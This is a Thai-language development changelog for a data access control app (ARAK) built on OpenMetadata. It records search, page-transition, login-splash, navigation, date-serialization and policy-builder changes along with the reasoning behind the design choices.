| tag | `tag` | `tag` | `tags` |
| classification | `classification` | `classification` | `classifications` |
| glossary term | `glossary_term` | `term` | `terms` |
| glossary | `glossary` | `glossary` | `glossaries` |
| domain (รวม sub-domain) | `domain` | `domain` | `domains` |
| data product | `data_product` | `dataProduct` | `dataProducts` |
| policy (ไม่เอา `ARCHIVED`) | `policy` | `policy` | – |

- **rank ต้องเป็น global** ถึงจะเรียงถูก: exact name = 0 · name prefix = 1 · fqn prefix = 2 · ที่เหลือ = 3 · เท่ากันแล้วตัดด้วย `length(name)` (match ใน `customer` ตรงกว่า match ใน `customer_address_history_archive`) → นี่คือเหตุผลที่ใช้ `UNION ALL` ก้อนเดียว ไม่ใช่ยิงเก้าคิวรีแล้วเอามาต่อกันฝั่ง Java
- branch ของ **vocabulary ทั้งหกสร้างจาก template เดียว** (`vocabulary(kind, table, facetType, parentColumn)`) พร้อม `LEFT JOIN` นับ `asset_facet` → ไม่ต้องเขียนซ้ำหกรอบแล้วปล่อยให้ค่อยๆ ต่างกัน
- **column match เฉพาะ `name` ไม่ match `fqn`** — เพราะ fqn ของ column ลงท้ายด้วย fqn ของ table คำว่า `cus` จึงจะลาก column ทั้ง 40 ตัวของ `customers` ขึ้นมากลบตัว table เอง (เจอตอนเทสจริง แล้วแก้)
- ตั้งใจ **ไม่ใช้ full-text (`tsvector`)** — ของพวกนี้เป็น identifier ไม่ใช่ prose คนพิมพ์ `cust` แล้วคาดหวัง prefix ไม่ใช่ lexeme · ถ้าโตเกิน `ILIKE` คำตอบคือ OpenSearch ตามแผน Phase 1.5 ไม่ใช่ index ที่แย่กว่าเดิมในนี้
- `q` สั้นกว่า 2 ตัวอักษร → คืน list ว่างทันที ไม่แตะ DB · `limit` cap ที่ 50

**`resources/SearchResource.java` (ใหม่)** — `GET /api/v1/search?q=&limit=` `@Secured` · แยกจาก `/v1/catalog/assets?search=` ตั้งใจ: อันนั้น filter ตารางและ paginate อันนี้ตอบ "ของชื่อนี้อยู่ไหน" แล้ว cap สั้น · รวมกันแปลว่าหน้า Catalog ต้องจ่ายค่า UNION อีกแปด branch ทุกครั้งที่เปลี่ยนหน้า

ลงทะเบียนใน `DacApplication.run()` ต่อจาก `GovernanceResource`

**Frontend**
- `frontend/app/src/api/search.ts` (ใหม่) — type `SearchHit` / `SearchKind` · `hitHref(hit)` ตัดสินปลายทาง: asset → `/catalog/<fqn>` · column → หน้า table ที่มันอยู่ (`parentFqn`) · policy → `/policies/<id>` · vocabulary → `/catalog?facet=<facetType>:<fqn>` (**ไปที่ข้อมูลที่ติด value นั้น ไม่ใช่หน้าอธิบาย value**) · `KIND_GROUPS` คุมลำดับหัวข้อ
- `layout/TopNav.tsx` → `GlobalSearch` เขียนใหม่เป็น **type-ahead** : debounce 200ms, ขั้นต่ำ 2 ตัวอักษร, TanStack Query `staleTime` 30s, `placeholderData` ไว้กัน list กระพริบตอนพิมพ์ต่อ
  - ผลลัพธ์จัดกลุ่มตาม kind แต่เก็บ flat list คู่กันไว้ให้ **ลูกศรขึ้น/ลงเดินตามที่ตาเห็น** (วนรอบ) · Enter เปิดตัวที่เลือก · ถ้ายังไม่ได้เลือกอะไร Enter ยังพาไป `/catalog?q=` เหมือนเดิม · Esc ปิด
  - **ทิ้ง dropdown `SCOPES` (All/Tables/Views/…) ไปแล้ว** — ตอนนี้ผลลัพธ์ข้ามชนิดอยู่แล้ว การให้เลือก asset type ก่อนค้นขัดกับโจทย์ และหน้า Catalog ก็ยังมี filter นั้นของตัวเอง
  - spinner **แทนที่** ปุ่มแว่นขยาย ไม่ใช่โผล่ข้างๆ ไม่งั้นความกว้างช่องกระตุกทุกคีย์
  - แถวผลลัพธ์ผูก `onMouseDown` + `preventDefault()` ไม่ใช่ `onClick` — ไม่งั้น blur ของ input ปิด panel ทิ้งก่อนคลิกจะลง

### B. Transition ตอนเปลี่ยนหน้า

**โจทย์:** *"เวลาเปลี่ยน Tab ให้มี transition load ด้วย"* แล้วตามด้วย *"ตอนนี้มันแวบเร็วไป"*

**โจทย์เพิ่มรอบที่สาม:** *"ทำไมเวลาเปลี่ยนหน้า มันเปลี่ยนเลย แล้วค่อยมีแวบๆ Transition"* — เวอร์ชันแรกหน่วงไม่จริง เนื้อหาสลับทันทีแล้ว transition ค่อยเล่นตามหลัง (ดู What Didn't Work) · **เขียนใหม่ทั้งกลไก**

**กลไกที่ถูก — หน่วง "location" ไม่ใช่หน่วง "children"**

`frontend/app/src/layout/RouteTransition.tsx` (เขียนใหม่) แยกเป็นสามชิ้น:

| export | อยู่ที่ไหน | ทำอะไร |
|---|---|---|
| `useRouteLag()` | เรียกใน `App.tsx` **เหนือ `<Routes>`** | คืน `{ display, loading }` — `display` คือ location ที่ตามหลัง address bar อยู่ `HOLD_MS` |
| `RouteProgress` | `App.tsx` เหนือ `<Routes>` | บาร์บนสุด ขับด้วย location **จริง** → ขึ้นตั้งแต่วินาทีที่คลิก |
| `RouteTransition` (default) | ครอบ `<Outlet />` ใน `AppShell` | เหลือแค่ `<div className="arak-page-enter" key={pathname+search}>` เฉยๆ ไม่มี timer แล้ว |

`App.tsx` เปลี่ยนเป็น **`<Routes location={display}>`**

- **หัวใจ:** `<Outlet />` resolve จาก router context ตอน render → **เก็บ element เก่าไว้ก็ไม่ช่วย** element เดิมมันก็ render หน้าใหม่อยู่ดี · ทางเดียวที่จะค้างหน้าเก่าได้จริงคือ **ค้าง location ที่ใช้ render**
- `useRouteLag()` **ต้องเรียกเหนือ `<Routes location=...>`** เพราะ react-router จะห่อ `LocationContext.Provider` ใหม่ให้ทุกอย่างที่อยู่ข้างใน (ยืนยันจาก `useRoutesImpl` ใน `react-router@6.30.6`) ถ้าเรียกข้างในมันจะอ่านค่าที่ตัวเองผลิต แล้วค้างตายอยู่กับที่
- **ผลพลอยได้:** `useLocation()` ใน `AppShell` ก็เป็นตัวหน่วงด้วย → **highlight ของ nav ขยับพร้อมหน้าที่มาถึงจริง** ไม่ใช่ขยับก่อนเนื้อหา (แบบเดียวกับตอนโหลดหน้าเว็บจริง)
- **`HOLD_MS = 420`** — หน้าที่คลิกออกมาค้างไว้ 420ms ระหว่างบาร์วิ่ง แล้วหน้าใหม่ค่อย mount + `arak-page-enter` (320ms) · คลิกซ้ำระหว่างหน่วง → อ่าน `latest` ref ตอนครบเวลา จึงไปหน้าที่กด**ล่าสุด** ไม่ใช่หน้าที่เริ่มหน่วง
- บาร์อยู่ต่อหลังสลับ จนกว่า **`useIsFetching() === 0`** → เข้าหน้าที่ query ช้า 2 วิ บาร์ก็อยู่ 2 วิ ไม่ใช่ประกาศชัยชนะแล้วโชว์ตารางเปล่า · เพดาน `CEILING_MS = 4000` วัดจาก `startedAt` ref (ไม่ใช่ `setTimeout` ที่จะถูกรีทุกครั้งที่ `fetching` ขยับ)
- render แรกของแอปไม่มี transition — `display` ตั้งต้นเท่ากับ location จริงอยู่แล้ว ไม่ต้องมี `first` ref อีก
- progress bar บางๆ ติดขอบบน (`z-100`) วิ่งไปหยุดที่ **88%** ด้วย easing ที่โหลดหนักช่วงต้น (ตอบสนองทันทีว่า "กดติดแล้ว") แล้วคลานต่อ → พอเสร็จจึงวิ่งไป 100% แล้วค่อย fade · บาร์ที่ถึงปลายแล้วค้างคือบาร์ที่โกหก

### C. Loading ตอน Sign in / Sign out

**โจทย์:** *"เวลา Sign in Sign out ให้มี Loading ออกแบบให้หน่อย"* แล้วตามด้วย *"ตอน Sign in หน้ามันแวบๆ ก่อนไปเจอ loading screen อะ"*

`frontend/app/src/auth/AuthSplash.tsx` (ใหม่) — ม่านเต็มจอ: โลโก้เต้นเบาๆ + หัวข้อ + บรรทัดบอกว่ากำลังทำอะไร + แถบ sweep แบบ indeterminate (ไม่มีใครรู้เปอร์เซ็นต์ บาร์ที่เดาตัวเลขคือบาร์ที่โกหก) · ค้าง `AUTH_SPLASH_MS = 900`

- ขับด้วย zustand store เล็กๆ (`useAuthSplash`) เพราะสองปลายอยู่คนละที่: ฟอร์ม login ยกม่าน, เมนู account บน header ก็ยกม่าน, ส่วนตัวที่วาดต้องอยู่ **เหนือ `<Routes>`** ใน `App.tsx` ไม่งั้นมันจะถูก unmount โดย navigation ที่มันกำลังคลุมอยู่
- **Sign out** — ยกม่านก่อน แล้วค่อย `signOut()` หลัง 900ms · ถ้าล้าง session ก่อน เมนู/shell/หน้าทั้งหมด unmount พร้อมกันแล้วหน้า login มาถึงก่อนใครจะทันเห็นว่าเกิดอะไร
- **Sign in — บั๊กที่ผู้ใช้ชี้** รอบแรกยกม่าน *หลัง* `await signIn()` สำเร็จ (เหตุผลตอนนั้น: รหัสผิดจะได้ไม่เห็น "Signing you in" แล้วโดนดึงกลับ) · **ผลคือมีเฟรมหนึ่งที่ token มีแล้วแต่ม่านยังไม่ขึ้น** → `<Navigate>` ใน `LoginPage` ยิงทันที หน้า guarded layout วาดแลบผ่านช่องนั้น = อาการ "แวบๆ ก่อนเจอ loading screen"
  **แก้:** ยกม่าน **ตั้งแต่กด submit** · รหัสผิด → `splash.hide()` ทันทีแล้วโชว์ error บนฟอร์ม
- keyframes ทั้งหมดอยู่ใน `theme/overrides.css` (`arak-page-enter`, `arak-progress-creep`, `arak-progress-finish`, `arak-splash-*`) พร้อม `@media (prefers-reduced-motion: reduce)` ที่ **หยุดการเคลื่อนไหวแต่ยังคงตัวบ่งชี้ไว้**

### D. Copyright ในราง — ชิดซ้าย

**โจทย์:** *"© 2026 MFEC / All rights reserved จัดวางไปสวย ชิดซ้านได้ไหม"* → `AppShell.tsx` เปลี่ยนจาก `text-center` เป็นชิดซ้ายบน gutter `px-3.5` เดียวกับ label ของ nav ด้านบน เส้นคั่นเยื้องเข้า `mx-3.5` ให้ตรงกัน → รางอ่านเป็นคอลัมน์เดียว

### E. ชิป governance บนแถว Catalog — อ่านไม่ออก

**โจทย์:** *"ตรงนี้ไม่สวยเลย ดูลำบาก"* (แนบสองรูป) — แถว filter พิมพ์ FQN ของ domain ยาว 110 ตัวอักษรจนตัดบรรทัด และการ์ด asset หนึ่งใบมี **11 ชิป** ที่พูดเรื่องเดียวกันซ้ำๆ (`PII ↑`, `Tier ↑`, domain สามชั้น, `PII.Sensitive`, `Tier.Tier2`, `Tier2`, …)

อาการเดียวแต่มาจาก **สามสาเหตุ** จึงแก้แยกกันสามที่:

| สาเหตุ | แก้ที่ไหน |
|---|---|
| พิมพ์ FQN เต็ม | `frontend/app/src/lib/fqn.ts` (ใหม่) — `shortFqn()` |
| `asset_facet` กาง ancestor ทั้งสายไว้ (ตั้งใจตาม FR-2A.2) | `facets.tsx` → `listFacets()` ตัด facet ที่เป็น **ancestor แท้** ของอีกตัวในชนิดเดียวกัน |
| facet บางชนิดพูดซ้ำกับส่วนอื่นของแถว | `OFF_THE_LIST = ['classifications', 'tier']` |

- **`src/lib/fqn.ts`** — มิเรอร์ `Fqns.java` ฝั่ง backend: `segments()` แยก segment แบบรู้จัก `"quoted.segment"`, `leaf()`, `isAncestor()` (เทียบ **ทีละ segment** ไม่ใช่ prefix ของ string — `Finance` ไม่ใช่ ancestor ของ `Finance Ops` และไม่ใช่ ancestor ของตัวเอง)
- **`shortFqn()` — กติกาคือ "งบของ parent" (`PARENT_BUDGET = 18`)** ไม่ใช่ "เอาสอง segment ท้าย" · `PII.Sensitive` → `PII / Sensitive` · `Finance.Risk.Credit` → `… / Risk / Credit` · sub-domain ของจริงที่ parent ยาว 45 ตัวอักษร → `… / Premium Service Delivery - IOS Data/DTP - Sub Domain` · **ตัด parent ทิ้งเสมอไม่ได้** เพราะ `PII.Sensitive` กับ `MFEC-PDPA.Sentitive` จะเหลือหน้าตาเหมือนกันเป๊ะ
- **ตัด ancestor ออกจากแถว** — `asset_facet` ตั้งใจกางทั้งสายเพื่อให้ selector เป็น index lookup (FR-2A.2) แต่แถวที่พิมพ์ออกมาทุกข้อต่อคือ 11 ชิปที่มีความหมายจริง 4 ชิป · ตัวที่ลึกสุด implies ตัวบน และ tooltip บอก FQN เต็มอยู่แล้ว · **หน้า asset detail ยังโชว์ครบทุกตัวเหมือนเดิม** — ที่นั่นความครบคือประเด็น
- **ชิปถูก truncate ไม่ใช่ wrap** — `Badge` ของ design system เป็น `size-max whitespace-nowrap` → ใส่ `tw:max-w-72` (ชิปบนการ์ด) / `tw:max-w-80` (ชิป filter) แล้วครอบข้อความด้วย `<span className="tw:truncate">` · ชิปที่ยืดตาม FQN ร้อยตัวอักษรจะลากทั้งแถวไปด้วย
- ทุกชิปมี `title` เป็น FQN เต็ม + ที่มา (direct/inherited from …, labelType, state) → ข้อมูลไม่ได้หายไปไหน แค่ไม่ต้องอ่านทั้งหมดพร้อมกัน

**เทสต์ใหม่:** `src/lib/fqn.test.ts` (3) + `src/pages/catalog/facets.test.ts` (2) · รวมฝั่ง FE เป็น **7 suites / 25 tests ผ่านหมด** · ยืนยันด้วยภาพจาก Playwright แล้ว: การ์ด `dtp-iprm` เหลือ 4 ชิป และไม่มีชิปไหนตัดบรรทัดอีก

---


## รอบก่อนหน้านั้น — App shell แบบ OpenMetadata, หน้า Settings, และบั๊กสองตัวที่ผู้ใช้ชี้

> รอบนี้เป็นงาน **UI shell + integration hardening** เกือบทั้งหมด milestone ไม่ขยับเป็นเปอร์เซ็นต์ใหญ่
> แต่ปิดบั๊กที่กระทบ **ทุก endpoint** ไปหนึ่งตัว (Jackson เขียนวันที่เป็น epoch) และเพิ่มหน้า Settings ของ FR-1.1

### A. Top navigation bar (`frontend/app/src/layout/TopNav.tsx` — เขียนใหม่ทั้งไฟล์)

เลียน header ของ OM 2.0.1 ตามภาพที่ผู้ใช้ส่งมา เรียงจากซ้าย:

| ส่วน | รายละเอียด |
|---|---|
| **`Brand`** | โลโก้ + `ARAK` / `Data access control` — **ย้ายจากรางซ้ายมาอยู่บนซ้ายสุดของ header** ตามที่ผู้ใช้สั่ง · กว้าง `tw:lg:w-66` = **เท่ากับความกว้างของรางพอดี** เพื่อให้ปุ่มพับตกอยู่ถัดจากขอบรางเป๊ะ · **ตอนพับหดเหลือ `tw:lg:w-14` (= ราง `w-18` ลบ padding ของ header) และซ่อนตัวหนังสือ เหลือแต่ mark** ด้วย transition 400ms ชุดเดียวกับราง -> โลโก้กับปุ่มพับขยับไปทางซ้ายพร้อมกัน แบบ OM · mark `size-10`, ชื่อ `text-lg` |
| ปุ่มพับราง | `LayoutLeft` ใน **`Tooltip` ของ design system** ("Collapse" / "Expand", `placement="right"`, มีลูกศร) |
| **`GlobalSearch`** | pill `h-10` + scope dropdown ในตัว (All / Tables / Views / Schemas / Databases / Services) + ปุ่ม `SearchLg` · submit → `/catalog?q=&type=` · โฟกัสด้วย `/` หรือ Cmd/Ctrl-K |
| **`DomainPicker`** | `Globe01` + รายชื่อ domain กาง sub-domain (indent ตาม depth, addon = จำนวน asset) → `/catalog?facet=domains:<fqn>` · **ไม่ render เลยถ้าไม่มี domain** |
| **`CreateMenu`** | Subscription / Data policy (`?kind=`) · Register a source |
| **`Notifications`** | `Bell01` — **แทน chip "Synced ..." ที่ผู้ใช้สั่งให้เอาออก** · จุดแดงขึ้นเฉพาะตอนมี alert จริง (crawl ล่าสุด `FAILED` หรือยัง `NEVER_RUN`) · admin เท่านั้น เพราะ endpoint เป็น admin |
| **`HelpMenu`** | `HelpCircle` — ทางลัด + ประโยคอธิบาย "strictest wins" |
| **`AccountMenu`** | avatar + ชื่อ + role · System status / Sources / Sign out |

### B. รางซ้าย (`frontend/app/src/layout/AppShell.tsx` — เขียนใหม่ทั้งไฟล์)

- **เลิกใช้ `NavList` ของ design system** แล้วเขียน `NavItem` เอง เพราะ `NavItemBase` **ประกาศ prop `iconOnly` ไว้แต่ไม่ได้ใช้จริงสักบรรทัด** ทำ icon-only rail ไม่ได้
- ใช้ **`NavLink` ของ react-router** (ไม่ใช่ `AriaLink`) — ได้ `aria-current="page"` มาฟรีและไม่ reload หน้า
- **พับแล้วย่อเป็นรางไอคอน `w-18` ไม่ใช่หายไป** ตามภาพ OM ที่ผู้ใช้ส่ง · ความกว้าง transition **400ms ease-in-out** (ผู้ใช้ขอให้ช้ากว่าเดิม) · จำสถานะไว้ใน `localStorage['arak.sidebar.collapsed']`
- ตอนพับ: ซ่อน label + badge, ใส่ `title` และ `aria-label` แทน
- `isCurrent()` match แบบ prefix ของ segment แรก (`/catalog/asset/x` -> Catalog ยังติด) แต่ `/` ต้องตรงเป๊ะ
- **แท็บที่เลือกอยู่เป็น pill สีแบรนด์ทึบ ตัวอักษรกับไอคอนขาว** (`tw:bg-brand-solid` / `tw:hover:bg-brand-solid_hover`) แบบเดียวกับ OM
- แถวเมนู `h-11` ไอคอน `size-6` (ผู้ใช้ขอให้ใหญ่ขึ้น) · ปุ่มพับสลับไอคอน **`LayoutLeft` ตอนกาง / `LayoutRight` ตอนพับ** ให้รู้ว่ากดแล้วจะเกิดอะไร
- ท้ายราง: เส้นคั่น + **`© 2026 MFEC — All rights reserved`** (แทนคำอธิบาย badge เดิม) · ซ่อนตอนพับ

> ⚠️ เคยลองทำ highlight นี้เป็น rule ใน `theme/overrides.css` ที่ผูกกับ `a[aria-current="page"]` **แล้วถอดออก** — ผู้ใช้ยังมองไม่เห็นความต่าง การประกาศสีไว้บน element ตรงๆ ตรวจสอบได้จาก DOM และไม่ต้องเดาว่า layer ไหนชนะ

### C. 🐛 Jackson เขียน `Instant` เป็น epoch — บั๊กที่กระทบทุก endpoint

อาการที่ผู้ใช้เห็น: **"Synced 20695d ago"** · ของจริงที่ API คืนคือ `"lastFullCrawlAt": 1789832026.308722`

- `environment.getObjectMapper().disable(WRITE_DATES_AS_TIMESTAMPS)` **ไม่มีผล**
- ใส่ที่ `bootstrap.getObjectMapper()` ด้วย **ก็ยังไม่มีผล**
- log ออกมาว่า flag เป็น `false` แล้ว แต่ response ยังเป็น epoch -> **Jersey ใช้ mapper คนละตัว**
- **สาเหตุ: message body writer ของ Jersey resolve ObjectMapper ผ่าน `ContextResolver<ObjectMapper>` ก่อนเสมอ** ถ้าไม่มี มันสร้าง default instance ของมันเอง
- แก้ด้วย `backend/dac-service/src/main/java/com/mfec/dac/json/JsonMapperProvider.java` (`@Provider implements ContextResolver<ObjectMapper>`) แล้ว register เข้า Jersey ใน `DacApplication.run()`
- ยืนยันแล้ว: `{"lastFullCrawlAt":"2026-09-19T15:33:46.308722Z", ...}` — **ทุก resource ได้ ISO-8601 ตามไปหมด ไม่ต้องไล่ format ทีละที่**

### D. 🐛 description ของ OM โผล่มาเป็น HTML ดิบ

ผู้ใช้เห็น `<p>Premium Service Delivery Domain</p>` บนหน้าจอ — OM 2.0 เก็บ description เป็น HTML และ React escape ให้

- เพิ่ม `frontend/app/src/lib/text.ts` -> `plainText()` แปลง block tag กับ `<br>` เป็นช่องว่าง, ตัด tag ที่เหลือ, decode entity (`&amp;`, `&#39;`, `&#x2F;`, ...), ยุบ whitespace
- ใช้ทุกจุดที่ render description: `AssetDetailPage` (asset + column), `CatalogPage` (การ์ด), `GovernancePage` (value + property)
- **จงใจไม่ใช้ `dangerouslySetInnerHTML` และไม่ลง sanitizer** — description ใครก็แก้ได้จาก catalog ถ้า render เป็น HTML ทุก description จะกลายเป็นที่วาง script · แถม `line-clamp` ตัดข้อความธรรมดาได้ตรงกว่า

### E. หน้า Settings — OpenMetadata connection (FR-1.1)

| ชิ้น | ไฟล์ |
|---|---|
| Endpoint | `backend/dac-service/src/main/java/com/mfec/dac/resources/OpenMetadataSettingsResource.java` — `GET /v1/settings/openmetadata`, `POST /v1/settings/openmetadata/test` · `@Secured("PLATFORM_ADMIN")` |
| API client | `frontend/app/src/api/system.ts` — `fetchOpenMetadataSettings()`, `testOpenMetadata()` |
| หน้าจอ | `frontend/app/src/pages/settings/OpenMetadataSettingsPage.tsx` |
| Route / nav | `/settings/openmetadata` (+ `/settings` redirect) ใน `App.tsx` · เมนู **Settings** ใน `navigation.ts` |

**อ่านอย่างเดียวโดยตั้งใจ และบอกไว้ใน payload เลยว่า `editable: false`** ไม่ใช่โชว์ปุ่มที่กดไม่ได้
`OM_JWT_TOKEN` / `OM_WEBHOOK_SECRET` มาจาก environment เท่านั้น · endpoint คืนแค่ **boolean ว่ามีไหม** ไม่คืนค่า ไม่คืน prefix ไม่คืนความยาว (บอกรูปร่าง token คือบอก token)
probe แยกเป็น `POST` ต่างหาก เปิดหน้าจะได้ไม่ค้างรอ host ที่ต่อไม่ติด · ทดสอบกับ instance จริงแล้ว: `{"reachable":true,"version":"2.0.1","versionMatches":true,"tookMs":25,"message":"Connected."}`

---

## รอบเก่ากว่านั้น — M3/M4

### 1. Backend — policy persistence + binding (ปิดช่องว่างใหญ่ที่สุดของ M3)

ก่อนหน้านี้ engine evaluate ได้แต่ **ไม่มีที่เก็บ policy** — policy มีอยู่แค่ใน unit test

| ไฟล์ | หน้าที่ |
|---|---|
| `backend/dac-service/.../policy/PolicyStore.java` | **ใหม่** — CRUD + lifecycle + versioning บน `policy` / `policy_version` |
| `backend/dac-service/.../policy/AssetContextLoader.java` | **ใหม่** — โหลด asset + facet + column facet + custom property เป็น `AssetContext` ที่ engine กิน · ใช้ร่วมกันทั้ง materializer และ (ต่อไป) decision path |
| `backend/dac-service/.../policy/PolicyBindingMaterializer.java` | **ใหม่** — resolve selector → `policy_binding` (FR-3.1.6) · `materialize(id)` / `materializeAll()` / `refresh(fqns)` |
| `backend/dac-service/.../resources/PolicyResource.java` | **ใหม่** — `@Path("/v1/policies")` |
| `backend/dac-service/src/test/.../policy/PolicyStoreIT.java` | **ใหม่** — 10 tests บน Postgres จริง |

การตัดสินใจที่สำคัญ:
- **ทุก write append เข้า `policy_version` ก่อนแล้วค่อยแก้ `policy`** — version history ไม่ขึ้นกับว่าใครจำได้ว่าต้องเขียน log
- **optimistic locking ด้วย `expectedVersion`** — UI ส่ง version ที่เปิดฟอร์มมา ถ้าไม่ตรง = `StaleVersionException` → 409 · **ไม่ใช่ last-write-wins** เพราะ policy ที่ถูกเขียนทับเงียบๆ = ข้อจำกัดหายไปโดยไม่มีใครรู้
- **เช็ค `ARCHIVED` ก่อนเช็ค version** — archived policy ถูกปฏิเสธไม่ว่าถืออยู่ version ไหน และข้อความ "reload แล้วลองใหม่" จะผิดถ้าตอบ version conflict
- **`transition()` bump version ด้วย** — การ activate คือการเปลี่ยนความหมายของระบบ คนที่ถือ v3 อยู่ระหว่างที่อีกคน activate ต้องกลับไปดูก่อน
- transition ที่ถูกกฎหมาย: `DRAFT → {PENDING_APPROVAL, ACTIVE, ARCHIVED}` · `PENDING_APPROVAL → {ACTIVE, DRAFT, ARCHIVED}` · `ACTIVE → {DISABLED, ARCHIVED}` · `DISABLED → {ACTIVE, ARCHIVED}` · **`ARCHIVED` เป็น terminal**
- **materializer รับ `AssetContextLoader` เข้ามา ไม่สร้างเอง** — webhook path กับ authoring path จะได้อ่าน facet ด้วย code ชุดเดียวกัน ไม่มีทาง drift
- `refresh(fqns)` แตะเฉพาะ asset ที่ระบุ → webhook เปลี่ยน tag 1 ตาราง ไม่ต้อง re-resolve ทั้ง estate

### 2. Backend — governance + identity read API (ของที่ UI ฝั่ง policy ต้องใช้)

| ไฟล์ | หน้าที่ |
|---|---|
| `backend/dac-service/.../catalog/GovernanceQuery.java` | **ใหม่** — อ่าน classification/tag, glossary/term, domain/sub-domain, data product, custom property def เป็น **tree** พร้อมยอด asset (รวม + direct) และยอด policy ที่อ้างถึงค่านั้น |
| `backend/dac-service/.../resources/GovernanceResource.java` | **ใหม่** — `@Path("/v1/governance")` |
| `backend/dac-service/.../identity/PrincipalQuery.java` | **ใหม่** — list principal, detail, **`attributeKeys()`** (key + จำนวนคนที่ถือ + ค่าที่มีจริง) |
| `backend/dac-service/.../resources/PrincipalResource.java` | **ใหม่** — `@Path("/v1/principals")` |
| `backend/dac-service/.../catalog/GovernanceStore.java` | **แก้** — `customProperties()` ตอน snapshot ว่าง เดิม `return` เฉยๆ ทำให้ definition ที่ถูกลบใน OM ค้างอยู่ตลอดกาล → เพิ่ม `DELETE FROM custom_property_def` ให้เหมือนตารางอื่น (ไม่งั้น builder เสนอ ABAC attribute ที่ไม่มี asset ไหนถืออยู่) |
| `backend/dac-service/src/test/.../catalog/GovernanceStoreIT.java` | **ใหม่** — 9 tests (เป็นตัวที่จับ bug ข้างบน) |
| `backend/dac-service/.../DacApplication.java` | register `PolicyResource`, `GovernanceResource`, `PrincipalResource` |

**ตัวเลขคู่ที่เป็นเหตุผลทั้งหมดของหน้า Governance:** OM แสดง tag/term/domain อยู่แล้ว สิ่งที่มันตอบไม่ได้คือ "ค่านี้แตะ asset กี่ตัวในระบบเรา และมี policy กี่ตัวพึ่งอยู่" — สองเลขนี้คือตัวบอกว่า tag ตัวไหน load-bearing และการลบมันจะปลดการป้องกันอะไรไปบ้าง

### 3. Endpoint ที่เพิ่มรอบนี้ (อยู่ใต้ `/api` ทั้งหมดเพราะ `rootPath: /api/*`)

| Method | Path | หมายเหตุ |
|---|---|---|
| GET | `/api/v1/policies` | `state`, `type`, `scopeLevel`, `limit`, `offset` |
| GET | `/api/v1/policies/{id}` | |
| GET | `/api/v1/policies/{id}/versions` | ประวัติจาก `policy_version` |
| GET | `/api/v1/policies/affecting/{fqn: .+}` | policy ที่ ACTIVE และผูกกับ asset นี้ (ฐานของ FR-3.1.5) |
| POST | `/api/v1/policies` | สร้าง (DRAFT) |
| PUT | `/api/v1/policies/{id}` | ต้องส่ง `expectedVersion` · mismatch = **409** |
| POST | `/api/v1/policies/{id}/lifecycle` | body `{"to":"ACTIVE"}` |
| POST | `/api/v1/policies/{id}/bindings/resolve` | re-resolve selector → คืน `{scanned, matched, added, removed}` |
| GET | `/api/v1/governance/vocabulary` | ก้อนเดียวจบ: classifications + glossaries + domains + dataProducts + customProperties |
| GET | `/api/v1/governance/{classifications,glossaries,domains,data-products,custom-properties}` | แยกชิ้น |
| GET | `/api/v1/principals` | `type`, `source`, `search`, `limit` |
| GET | `/api/v1/principals/attributes` | **vocabulary ของ attribute** — key, source, จำนวนคน, ค่าที่มีจริง |
| GET | `/api/v1/principals/{username}` | |

### 4. Frontend — Policy Builder + Governance + People

| ไฟล์ | หน้าที่ |
|---|---|
| `frontend/app/src/api/policies.ts` | **ใหม่** — fetch/create/update/transition/resolveBindings + re-export `Policy` จาก generated IR |
| `frontend/app/src/api/governance.ts` | **ใหม่** — vocabulary, principals, attribute vocabulary, `flatten()` |
| `frontend/app/src/pages/policies/controls.tsx` | **ใหม่** — `Select` / `TextField` / ปุ่มเล็ก ที่ใช้ `<select>`/`<input>` ดิบ + token class ร่วม (convention ของเรโป) |
| `frontend/app/src/pages/policies/policyLanguage.ts` | **ใหม่** — readback: แปลง policy document เป็นประโยคภาษาคน |
| `frontend/app/src/pages/policies/enforcement.ts` | **ใหม่** — **capability matrix (FR-6.0b)** ต่อโหมด × engine |
| `frontend/app/src/pages/policies/SelectorBuilder.tsx` | **ใหม่** — "ผูกกับ asset ไหน" (facet + operator + value, and/or/not) |
| `frontend/app/src/pages/policies/SubjectBuilder.tsx` | **ใหม่** — "ใคร" — principal OR-list + attribute AND-list + `expr` + time window + context |
| `frontend/app/src/pages/policies/DataPolicyBuilder.tsx` | **ใหม่** — RLS (5 kinds) + column rule (MASK/HIDE/ALLOW) + masking function 6 ตัว + cell condition |
| `frontend/app/src/pages/policies/PolicyListPage.tsx` | **ใหม่** — `/policies` · ทุกแถวมี readback ของตัวเอง |
| `frontend/app/src/pages/policies/PolicyBuilderPage.tsx` | **ใหม่** — `/policies/new`, `/policies/:id` · ฟอร์มซ้าย + rail ขวา |
| `frontend/app/src/pages/policies/policyLanguage.test.ts` | **ใหม่** — 6 tests คุมสองความผิดพลาดที่อันตรายที่สุด (ดูด้านล่าง) |
| `frontend/app/src/pages/governance/GovernancePage.tsx` | **ใหม่** — `/governance` · 4 แท็บ tree |
| `frontend/app/src/pages/governance/PrincipalsPage.tsx` | **ใหม่** — `/principals` · read-only |
| `frontend/app/src/App.tsx` | route `/governance`, `/principals`, `/policies`, `/policies/new`, `/policies/:id` |
| `frontend/app/src/layout/navigation.ts` | เพิ่มหมวด **Governance** + **People** · `Policies` เลิกเป็น placeholder (`milestone: 'M3'` → `null`) |

**การตัดสินใจที่สำคัญของ Policy Builder:**
- **ฟอร์มอยู่ซ้าย ความหมายของฟอร์มอยู่ขวา และเห็นตลอดเวลา** — rail ขวาอ่าน policy กลับมาเป็นประโยค, บอกว่าจะแตะ asset กี่ตัว, และบอกว่า **โหมดไหนใน 3 โหมดแบกมันไหว** — *ก่อน* กด apply ไม่ใช่หลัง
- **ไม่แยกแท็บ RBAC / ABAC / rule / time** — comment ในไฟล์เขียนไว้ตรงๆ ว่ามันคือ predicate เดียวกันมองคนละมุม ทุกบล็อกถูก AND เข้าด้วยกัน การแยกแท็บจะสื่อว่าเป็น 4 ระบบ
- **selector ว่าง = save ไม่ได้** — `hasCondition()` กันไว้ที่ปุ่ม เพราะ policy ที่ผูกกับศูนย์ asset จะขึ้นเป็น ACTIVE ในลิสต์ทั้งที่ไม่ทำอะไรเลย
- **เปลี่ยน action จาก MASK เป็น HIDE/ALLOW แล้ว `masking` ถูกทิ้ง** — document ที่พูดสองเรื่องพร้อมกัน compiler ต้องเลือกเอง และคนอ่านไม่มีทางรู้ว่ามันเลือกอันไหน
- **`describeSelector(ว่าง)` ต้องคืน `'nothing'` ห้ามคืน `'everything'`** — เป็น mistranslation ที่อันตรายที่สุดที่หน้านี้ทำได้ → มี unit test คุมไว้
- rail แสดง **PostgreSQL / SQL Server สลับได้** เพราะข้อจำกัดต่างกันจริง (DDM ของ MSSQL เป็น on/off ต่อ column · PG ไม่มี column masking ใน core)

